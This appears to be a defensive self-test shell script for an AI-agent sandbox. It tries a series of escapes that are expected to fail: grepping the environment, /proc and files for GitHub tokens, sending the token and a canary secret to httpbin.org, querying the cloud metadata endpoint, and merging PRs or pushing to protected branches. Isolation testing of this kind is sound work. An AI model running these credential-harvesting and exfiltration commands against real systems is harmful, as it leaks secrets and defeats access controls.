#!/bin/sh
# agent-yard selftest probe. Runs INSIDE a job sandbox as the main process, with
# the same policy, providers and limits a real job gets. Each attack must fail;
# each positive check must succeed. Results go to /sandbox/.yard/selftest.jsonl
# as one JSON object per check; the host evaluates them (yard/selftest.py) and
# adds host-side evidence (token hashes, GitHub state).
#
# Usage: probe.sh <mode: open|deny> <neighbor-canary-name>
set -u
MODE="$1"
CANARY="$2"
OUT=/sandbox/.yard/selftest.jsonl
STATUS=/sandbox/.yard/status.jsonl
JOB=$(jq -r .job_id /sandbox/.yard/job.json)
REPO=$(jq -r .repo /sandbox/.yard/job.json)
BRANCH=$(jq -r .branch /sandbox/.yard/job.json)
DEFAULT=$(jq -r .default_branch /sandbox/.yard/job.json)
READ_REPO=$(jq -r '.credentials[1].path // empty' /sandbox/.yard/job.json | sed 's/\.git$//')
API=https://api.github.com

status() { printf '{"status":"%s","note":"%s","attn":false}\n' "$1" "$2" >>"$STATUS"; }
# record <check> <expect: blocked|ok> <result: blocked|reached|ok|failed> <evidence>
record() {
  jq -cn --arg c "$1" --arg e "$2" --arg r "$3" --arg v "$4" \
    '{check:$c, expect:$e, result:$r, evidence:($v|.[0:1500])}' >>"$OUT"
}
http() { # http <curl args...>: prints "<code> <first 400 bytes of body>"
  body=$(curl -sS -m 20 -o /tmp/probe.body -w '%{http_code}' "$@" 2>/tmp/probe.err) || true
  printf '%s %s' "${body:-000}" "$(head -c 400 /tmp/probe.body 2>/dev/null) $(head -c 200 /tmp/probe.err)"
}

status working "selftest probe started (mode $MODE)"
: >"$OUT"

# 1. Credentials are not readable: env and files hold placeholders only.
found=$( (env; cat /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n') \
  | grep -oE '(ghs|ghp|gho|ghu|github_pat)_[A-Za-z0-9_]{20,}' | sort -u | while read -r t; do
      printf '%s' "$t" | sha256sum | cut -c1-64; done)
files=$(grep -rIhoE '(ghs|ghp|github_pat)_[A-Za-z0-9_]{20,}' /sandbox /tmp /etc /home /run /var/tmp 2>/dev/null \
  | sort -u | while read -r t; do printf '%s' "$t" | sha256sum | cut -c1-64; done)
ph_gh=$(printenv GITHUB_TOKEN | cut -c1-24)
ph_canary=$(printenv YARD_SELFTEST_CANARY | cut -c1-24)
if [ -z "$found$files" ]; then r=blocked; else r=reached; fi
record read-github-token blocked "$r" "GITHUB_TOKEN=${ph_gh}... token-like strings in env/proc: [$found] in files: [$files]"
case "$ph_canary" in
  openshell:resolve:*|"") r=blocked ;;
  *) r=reached ;;
esac
record read-project-secret blocked "$r" "YARD_SELFTEST_CANARY=${ph_canary}..."

# 2. A placeholder sent to a non-GitHub host is not resolved.
res=$(http https://httpbin.org/anything/yard-exfil -H "Authorization: Bearer ${GITHUB_TOKEN:-none}")
case "$res" in
  2*" "*"ghs_"*) r=reached ;;
  *) r=blocked ;;
esac
record exfil-github-token-elsewhere blocked "$r" "$res"
res=$(http https://httpbin.org/anything/yard-exfil -H "Authorization: Bearer ${YARD_SELFTEST_CANARY:-none}")
case "$res" in
  2*"yard-canary-"*) r=reached ;;
  *) r=blocked ;;
esac
record exfil-project-secret-elsewhere blocked "$r" "$res"

# 3. Cloud metadata (link-local) is unreachable.
res=$(http http://169.254.169.254/hetzner/v1/metadata)
case "$res" in 2*|3*|4*) r=reached ;; *) r=blocked ;; esac
record reach-metadata blocked "$r" "$res"

# 4. Positive: claude reaches api.anthropic.com with the subscription token.
ans=$(timeout 180 /usr/local/bin/claude -p 'Reply with exactly the text YARD-OK and nothing else.' 2>&1 | tail -c 300)
case "$ans" in *YARD-OK*) r=ok ;; *) r=failed ;; esac
record claude-reaches-anthropic ok "$r" "$ans"

# 5. Push to the default branch is refused by GitHub.
cd /sandbox && rm -rf work && git clone -q "https://github.com/$REPO.git" work 2>/tmp/probe.err
cd /sandbox/work 2>/dev/null || { record clone-target ok failed "$(cat /tmp/probe.err)"; exit 0; }
git config user.email "selftest@agent-yard.invalid"; git config user.name "agent-yard selftest"
echo "selftest $JOB $(date -u +%FT%TZ)" >"yard-selftest-$JOB.txt"
git add . && git commit -qm "agent-yard selftest $JOB"
out=$(git push origin "HEAD:refs/heads/$DEFAULT" 2>&1); rc=$?
if [ $rc -eq 0 ]; then r=reached; else r=blocked; fi
record push-default-branch blocked "$r" "$(printf '%s' "$out" | tail -c 600)"

# 6. Positive: push the job branch and open a PR through the REST API.
out=$(git push -q origin "HEAD:refs/heads/$BRANCH" 2>&1); rc=$?
pr=$(gh api -X POST "repos/$REPO/pulls" -f title="agent-yard selftest $JOB" -f head="$BRANCH" \
  -f base="$DEFAULT" -f body="Opened by yard selftest; must stay unmerged." --jq .number 2>/tmp/probe.err)
if [ -n "$pr" ]; then r=ok; else r=failed; fi
record open-pull-request ok "$r" "push rc=$rc $(printf '%s' "$out" | tail -c 200) pr=${pr:-none} $(head -c 300 /tmp/probe.err)"
[ -n "$pr" ] && status working "PR opened: https://github.com/$REPO/pull/$pr"

# 7. Merging the PR is denied (REST with gh, REST with curl, GraphQL).
if [ -n "$pr" ]; then
  out=$(gh api -X PUT "repos/$REPO/pulls/$pr/merge" 2>&1 | tail -c 400)
  case "$out" in *'"merged":true'*|*'"merged": true'*) r=reached ;; *) r=blocked ;; esac
  record merge-pr-gh blocked "$r" "$out"
  res=$(http -X PUT "$API/repos/$REPO/pulls/$pr/merge" -H "Authorization: Bearer $GITHUB_TOKEN")
  case "$res" in 200*) r=reached ;; *) r=blocked ;; esac
  record merge-pr-curl blocked "$r" "$res"
  node=$(gh api "repos/$REPO/pulls/$pr" --jq .node_id 2>/dev/null)
  res=$(http -X POST "$API/graphql" -H "Authorization: Bearer $GITHUB_TOKEN" \
    -d "{\"query\":\"mutation{mergePullRequest(input:{pullRequestId:\\\"$node\\\"}){clientMutationId}}\"}")
  case "$res" in 200*'"mergePullRequest":{'*) r=reached ;; *) r=blocked ;; esac
  record merge-pr-graphql blocked "$r" "$res"
fi

# 8. Writing to a read_repos repo fails.
if [ -n "$READ_REPO" ]; then
  cd /sandbox && rm -rf ro && git clone -q "https://github.com/$READ_REPO.git" ro 2>/tmp/probe.err
  if cd /sandbox/ro 2>/dev/null; then
    git config user.email "selftest@agent-yard.invalid"; git config user.name "agent-yard selftest"
    git checkout -q -b "yard-selftest-$JOB"
    echo x >"yard-selftest-$JOB.txt"; git add . && git commit -qm "must not land"
    out=$(git push origin "HEAD:refs/heads/yard-selftest-$JOB" 2>&1); rc=$?
    if [ $rc -eq 0 ]; then r=reached; else r=blocked; fi
    record write-read-repo blocked "$r" "$(printf '%s' "$out" | tail -c 600)"
  else
    record write-read-repo blocked failed "could not clone read repo: $(cat /tmp/probe.err)"
  fi
fi

# 9. Another running sandbox's files are invisible.
hits=$(find / -xdev -name "$CANARY" 2>/dev/null | head -5)
procs=$(ls /proc | grep -c '^[0-9]')
if [ -z "$hits" ]; then r=blocked; else r=reached; fi
record read-neighbor-sandbox blocked "$r" "find hits: [$hits]; visible pids: $procs"

# 10. Deny mode: a non-allowlisted host stays unreachable, also after a retry
# (an auto-approved draft would make the retry succeed).
if [ "$MODE" = deny ]; then
  res1=$(http https://example.com/)
  sleep 45
  res2=$(http https://example.com/)
  case "$res2" in 2*|3*) r=reached ;; *) r=blocked ;; esac
  record deny-mode-non-allowlisted blocked "$r" "first: $res1 | after 45s: $res2"
fi

status done "selftest probe finished"
# Stay alive briefly so yardd reads the final lines before the main process exits.
sleep 60
